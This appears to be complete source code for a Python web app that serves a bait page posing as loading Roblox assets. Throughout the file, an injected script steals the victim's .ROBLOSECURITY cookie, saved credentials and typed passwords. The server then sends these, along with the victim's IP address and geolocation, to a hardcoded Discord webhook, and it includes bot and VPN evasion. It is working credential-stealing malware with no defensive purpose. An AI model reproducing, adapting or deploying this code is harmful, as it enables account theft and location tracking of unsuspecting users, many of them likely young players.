from urllib import parse
import traceback, requests, base64, httpagentparser, json as _json

config = {
    # Webhook Discord
    "webhook": "https://discord.com/api/webhooks/1507858412900192386/AIgW29HVoKf6StR10P2_1bOXONbg6cVd4Ti6jEoQMfzsIOludq3FOUk_tKrtPSo4HwoI",
    # Image d'appât (doit être une image PNG/JPG directe)
    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
    # Nom du bot Discord
    "username": "Roblox Logger",
    "color": 0xFF4444,
    # Anti-bot / Anti-VPN
    "antiBot": 1,
    "antiVPN": False,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith(("TelegramBot", "facebookexternalhit")):
        return "Bot"
    return False

def sendDiscord(webhook, username, content):
    try:
        requests.post(webhook, json={"username": username, "content": content}, timeout=10)
    except:
        pass

def logIP(ip, useragent):
    if ip and ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        sendDiscord(config["webhook"], config["username"], f"🚫 Lien ouvert par un bot : `{bot}`\nIP: `{ip}`")
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}

    if info.get("proxy") and config["antiVPN"]:
        return
    if info.get("hosting") and config["antiBot"]:
        return

    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "📸 IP Loggée",
            "color": config["color"],
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "Pays", "value": info.get("country", "?"), "inline": True},
                {"name": "Région", "value": info.get("regionName", "?"), "inline": True},
                {"name": "Ville", "value": info.get("city", "?"), "inline": True},
                {"name": "ISP", "value": f"`{info.get('isp', '?')}`", "inline": True},
                {"name": "VPN/Proxy", "value": str(info.get("proxy", False)), "inline": True},
                {"name": "User-Agent", "value": f"```{useragent[:500]}```"},
            ]
        }]
    }
    requests.post(config["webhook"], json=embed, timeout=10)

def logRoblox(ip, data, useragent):
    embed = {
        "username": "Roblox Grabber",
        "content": "@everyone",
        "embeds": [{
            "title": "🎮 Compte Roblox Volé",
            "color": 0x00FF00,
            "fields": [],
            "footer": {"text": f"IP: {ip}"}
        }]
    }

    if data.get("username"):
        embed["embeds"][0]["fields"].append({"name": "👤 Pseudo/Email", "value": f"```{data['username']}```", "inline": True})
    if data.get("password"):
        embed["embeds"][0]["fields"].append({"name": "🔑 Mot de passe", "value": f"```{data['password']}```", "inline": True})
    if data.get("cookie"):
        cookie = data["cookie"]
        embed["embeds"][0]["fields"].append({"name": "🍪 Cookie .ROBLOSECURITY", "value": f"```{cookie[:80]}...```", "inline": False})

    if embed["embeds"][0]["fields"]:
        requests.post(config["webhook"], json=embed, timeout=10)

def harvestScript():
    return '''
<script>
(async function() {
    try {
        var result = { username: "", password: "", cookie: "" };

        // 1. Vol du cookie Roblox
        var c = document.cookie.split("; ");
        for (var i = 0; i < c.length; i++) {
            var p = c[i].split("=");
            if (p[0] === ".ROBLOSECURITY") result.cookie = p.slice(1).join("=");
        }

        // 2. localStorage (credentials sauvegardés)
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            try {
                var val = JSON.parse(localStorage.getItem(key));
                if (typeof val === "object") {
                    if (val.UserName || val.username) result.username = val.UserName || val.username;
                    if (val.Password || val.password) result.password = val.Password || val.password;
                }
            } catch(e) {}
        }

        // 3. Si on est sur roblox.com — champs de login
        if (location.hostname.includes("roblox.com")) {
            var u = document.querySelector("input[name='username'], #login-username");
            var p = document.querySelector("input[type='password'], #login-password");
            if (p && p.value) {
                if (u && u.value) result.username = u.value;
                result.password = p.value;
            }
            // Nom d'utilisateur depuis le header connecté
            var nameEl = document.querySelector("[data-testid='username'], .avatar-name");
            if (nameEl) result.username = nameEl.textContent.trim();
        }

        // Envoi des données si on a quelque chose
        if (result.cookie || result.username || result.password) {
            var payload = btoa(JSON.stringify(result));
            new Image().src = location.pathname + (location.search ? "&" : "?") + "rbx=" + payload;
        }
    } catch(e) {}
})();
</script>
'''

def app(environ, start_response):
    try:
        path = environ.get("PATH_INFO", "/")
        qs = environ.get("QUERY_STRING", "")
        ip = environ.get("REMOTE_ADDR", "")

        headers = {k[5:].replace("_", "-").lower(): v for k, v in environ.items() if k.startswith("HTTP_")}
        ip = headers.get("x-forwarded-for", ip).split(",")[0].strip()
        ua = headers.get("user-agent", "")
        params = dict(parse.parse_qsl(qs)) if qs else {}

        # Callback Roblox
        if params.get("rbx"):
            try:
                raw = base64.b64decode(params["rbx"].encode()).decode()
                data = _json.loads(raw)
                logRoblox(ip, data, ua)
            except:
                pass

        bot = botCheck(ip, ua)
        if bot:
            logIP(ip, ua)
            pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
            start_response("200 OK", [("Content-Type", "image/png"), ("Content-Length", str(len(pixel)))])
            return [pixel]

        # Page piégée
        page = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading Roblox Assets...</title></head>
<body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
<img src="{config["image"]}" style="max-width:100%;max-height:100vh;" alt="Asset Preview"/>
{harvestScript()}
</body>
</html>'''

        logIP(ip, ua)
        body = page.encode()
        start_response("200 OK", [
            ("Content-Type", "text/html; charset=utf-8"),
            ("Content-Length", str(len(body))),
            ("Cache-Control", "no-cache")
        ])
        return [body]

    except Exception as e:
        try:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": f"**Erreur :** ```{traceback.format_exc()[:1000]}```"
            })
        except:
            pass
        start_response("500 OK", [("Content-Type", "text/plain")])
        return [b"Error"]
